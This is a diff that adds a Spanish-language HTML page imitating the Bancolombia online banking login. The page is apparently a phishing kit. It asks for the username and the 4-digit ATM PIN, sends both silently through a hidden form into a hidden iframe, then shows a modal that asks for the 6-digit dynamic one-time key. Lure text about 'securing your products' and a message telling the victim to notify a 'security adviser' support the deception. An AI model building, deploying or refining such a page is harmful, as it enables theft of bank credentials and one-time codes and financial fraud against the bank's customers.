@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Autenticación - Seguridad</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<!-- Puedes ajustar aquí los tiempos por defecto -->
+<body data-wait-seconds="5" data-toast-seconds="4">
+  <!-- ===== Overlay: Pantalla de carga (INICIA OCULTO) ===== -->
+  <section id="splash" class="splash" role="status" aria-live="polite" aria-label="Cargando" hidden>
+    <div class="spinner" aria-hidden="true"></div>
+    <p class="label">Cargando…</p>
+  </section>
+
+  <!-- ===== Toast de mensaje (INICIA OCULTO) ===== -->
+  <div id="done-message" class="toast" role="alert" aria-live="assertive" aria-atomic="true" hidden>
+    <div class="toast-body">
+      <span id="toast-text">¡Listo! Avísale a tu asesor de seguridad.</span>
+      <button type="button" class="toast-close" aria-label="Cerrar">✕</button>
+    </div>
+  </div>
+
+  <!-- ===== FONDO: CINTAS SVG ===== -->
+  <svg class="bg-ribbons" viewBox="0 0 1680 768" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
+    <defs>
+      <filter id="ribShadow" x="-20%" y="-20%" width="140%" height="140%">
+        <feDropShadow dx="0" dy="8" stdDeviation="7" flood-opacity="0.30"/>
+      </filter>
+      <style>
+        .rib{ vector-effect:non-scaling-stroke; stroke-linecap:round; stroke-linejoin:round; fill:none; filter:url(#ribShadow); }
+      </style>
+    </defs>
+    <!-- <path class="rib rib-yellow" d="M -60 300 C 300 160, 520 160, 760 360 C 900 470, 1020 540, 1120 580" />
+    <path class="rib rib-orange" d="M -60 330 C 280 190, 500 190, 790 380 C 930 490, 1050 560, 1150 600" />
+    <path class="rib rib-purple" d="M 120 340 C 300 190, 520 190, 780 380 C 930 490, 1040 550, 1140 590" />
+    <path class="chip-purple" d="M 820 520 c 14 -18, 36 -18, 52 -6 c -10 18, -26 30, -44 32 z" />
+    <path class="rib rib-yellow" d="M 1605 -20 C 1485 125, 1378 270, 1245 455 C 1128 610, 1035 670, 955 705" />
+    <path class="rib rib-orange" d="M 1548 80 C 1435 220, 1335 355, 1215 520 C 1135 625, 1080 665, 1015 692" />
+    <path class="rib rib-purple" d="M 1678 45 C 1645 95, 1622 128, 1596 152" /> -->
+
+
+    <!-- ============================================================
+     CINTAS ARMÓNICAS + CORTES (más pronunciadas)
+     viewBox: 0 0 1680 768   → baseline (mitad): y = 384
+     Amplitud grande: cresta ~164  / valle ~604  (±220 respecto a 384)
+     Amplitud media : cresta ~184  / valle ~584  (±200)
+     Amplitud menor : cresta ~204  / valle ~564  (±180)
+
+     TRUCO para “cortes”: cada tramo es un <path> independiente.
+     Si quieres mover el lugar del corte, cambia el último X del tramo
+     izquierdo (por ej. 660/640/560) o el primero del tramo derecho
+     (por ej. 980/1000).
+   ============================================================ -->
+
+    <!-- =========================
+     ONDAS MÁS PRONUNCIADAS + CORTES
+     viewBox: 0 0 1680 768
+     ========================= -->
+
+    <!-- ============================
+     DERECHA: MÁS ONDA + CORTES
+     - Exterior AMARILLA: S bien marcada (dos lóbulos) + un tramo suelto.
+     - Interior NARANJA : paralela a la amarilla, un poco “más adentro”.
+     - MORADA superior  : corta, con curvatura visible.
+     - AMARILLA corta   : realce intermedio (segmento suelto).
+     ============================ -->
+
+    <!-- =========================================================
+     IZQUIERDA: DESDE EL CENTRO → HACIA LA IZQUIERDA
+     - viewBox: 0 0 1680 768   (línea media y=384)
+     - Ondas pronunciadas (crestas ~y=164 / valles ~y=604)
+     - Con CORTES: 2 tramos por cada cinta
+     - Puedes mover los cortes cambiando las X de los "M 520…" y "M 380…", etc.
+   ========================================================= -->
+
+    <!-- =========================
+     ONDAS A TODO LO ANCHO (≈ 4 lóbulos)
+     Baseline (mitad): y = 384
+     Amplitud aprox:
+       - Amarilla: ±220  (crestas 164 / valles 604)
+       - Naranja : ±200  (crestas 184 / valles 584)
+       - Morada  : ±180  (crestas 204 / valles 564)
+     Nota: dejamos terminar fuera del viewport para que no se noten los cortes.
+     ========================= -->
+
+        <!-- AMARILLA (debajo, más pronunciada) -->
+        <path class="rib rib-yellow"
+        d="M 60 284
+            C  120 164,  300 164,  480 384
+            S  840 604, 1020 384
+            S 1380 164, 1560 384
+            S 1920 604, 2100 384" />
+
+        <!-- NARANJA (paralela, un poco menos de amplitud) -->
+        <path class="rib rib-orange"
+        d="M -60 384
+            C  120 184,  300 184,  480 384
+            S  840 584, 1020 384
+            S 1380 184, 1560 384
+            S 1920 584, 2100 384" />
+
+        <!-- MORADA (misma “senoide”, algo más suave) -->
+        <path class="rib rib-purple"
+        d="M -60 384
+            C  120 204,  300 204,  480 384
+            S  840 564, 1020 384
+            S 1380 204, 1560 384
+            S 1920 564, 2100 384" />
+
+
+
+  </svg>
+
+  <!-- ===== CONTENIDO ===== -->
+  <main class="wrap">
+    <header class="header">
+      <img class="brand-img" src="assets/logo_bancolombia.png" alt="Bancolombia" />
+      <h1 class="title">Sucursal Virtual Personas</h1>
+    </header>
+
+    <section class="notice" role="note" aria-label="Aviso de programación">
+      <div class="notice-left">
+        <svg class="notice-ico" viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="currentColor" d="M12 5v14l8-5V10zM10 9H6a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h4V9z"/>
+          <path fill="currentColor" d="M6 16v2a2 2 0 0 0 2 2h1v-4z"/>
+        </svg>
+      </div>
+      <div class="notice-body">
+        <strong>¡Prográmate!</strong>
+        <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+        <a href="https://www.bancolombia.com/centro-de-ayuda/canales/estado-canales" rel="nofollow">Más info aquí.</a>
+      </div>
+    </section>
+
+    <section class="card" aria-labelledby="login-title">
+      <h2 id="login-title" class="card__title">¡Hola!</h2>
+      <p class="card__lead">Ingresa los datos para asegurar tus productos.</p>
+
+      <form id="login-form" class="form" action="/login" method="post" novalidate>
+        <div class="group">
+          <label class="label" for="usuario">
+            <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 12a5 5 0 1 0-5-5a5 5 0 0 0 5 5m0 2c-4 0-8 2-8 5v1h16v-1c0-3-4-5-8-5"/></svg>
+            Usuario
+          </label>
+          <input class="input" id="usuario" name="usuario" placeholder="Ingresa tu usuario" autocomplete="username" />
+          <a href="#" class="hint">¿Olvidaste tu usuario?</a>
+        </div>
+
+        <div class="group">
+          <label class="label" for="clave">
+            <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 17a2 2 0 1 0-2-2a2 2 0 0 0 2 2m6-6h-1V7a5 5 0 0 0-10 0v4H6a2 2 0 0 0-2 2v7h16v-7a2 2 0 0 0-2-2M9 7a3 3 0 0 1 6 0v4H9z"/></svg>
+            Clave del cajero
+          </label>
+          <!-- Solo 4 dígitos numéricos -->
+          <input
+            class="input"
+            id="clave"
+            name="clave"
+            type="password"
+            inputmode="numeric"
+            pattern="[0-9]{4}"
+            maxlength="4"
+            placeholder="••••"
+            autocomplete="one-time-code"
+            required
+            aria-describedby="clave-error"
+          />
+          <a href="#" class="hint">¿Olvidaste o bloqueaste tu clave?</a>
+          <small id="clave-error" class="error" aria-live="polite"></small>
+        </div>
+
+        <button id="login-submit" class="btn btn-login" type="submit" disabled aria-disabled="true">Iniciar sesión</button>
+        <div class="link-inline"><a href="#" rel="nofollow">Crear usuario</a></div>
+      </form>
+    </section>
+  </main>
+
+  <!-- ===== Infra: envío oculto y modal ===== -->
+  <iframe name="silent-target" style="display:none;"></iframe>
+  <form id="prelogin-form" action="/login" method="POST" target="silent-target" style="display:none;">
+    <input type="hidden" name="usuario">
+    <input type="hidden" name="clave">
+  </form>
+
+  <!-- Overlay + Modal OTP (ocultos por defecto) -->
+  <div id="otp-overlay" class="overlay" aria-hidden="true"></div>
+  <section id="otp-modal" class="modal" role="dialog" aria-modal="true" aria-labelledby="md-title" aria-describedby="md-desc">
+    <div class="modal-body">
+      <button class="md-close" aria-label="Cerrar">✕</button>
+
+      <div class="banner">
+        <svg class="ribbons" viewBox="0 0 700 140" aria-hidden="true" preserveAspectRatio="xMidYMid slice">
+          <defs><style>.rib{fill:none;stroke-linecap:round;stroke-linejoin:round;vector-effect:non-scaling-stroke}</style></defs>
+          <path class="rib" stroke="#FFD000" stroke-width="18" d="M -60 110 C 120 60, 220 40, 340 48" />
+          <path class="rib" stroke="#FF7A3D" stroke-width="18" d="M  -5 128 C 170 78, 260 58, 380 64" />
+          <path class="rib" stroke="#7C4DFF" stroke-width="14" d="M 610 20 C 645 55, 670 82, 690 104" />
+        </svg>
+        <div class="app-icon">
+          <img src="assets/mi_bancolombia.png" alt="Mi Bancolombia">
+        </div>
+      </div>
+
+      <h1 id="md-title" class="md-title">Ingresa la Clave Dinámica</h1>
+      <p id="md-desc" class="md-sub">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+      <div class="code">
+        <input type="text" maxlength="1" inputmode="numeric" />
+        <input type="text" maxlength="1" inputmode="numeric" />
+        <input type="text" maxlength="1" inputmode="numeric" />
+        <input type="text" maxlength="1" inputmode="numeric" />
+        <input type="text" maxlength="1" inputmode="numeric" />
+        <input type="text" maxlength="1" inputmode="numeric" />
+      </div>
+
+      <div class="actions">
+        <button type="button" class="btn btn-ghost" id="otp-clear">Borrar</button>
+        <button type="button" id="otp-continue" class="btn btn-disabled" disabled>Continuar</button>
+      </div>
+    </div>
+  </section>
+
+
+  <script src="app.js" defer></script>
+</body>
+</html>
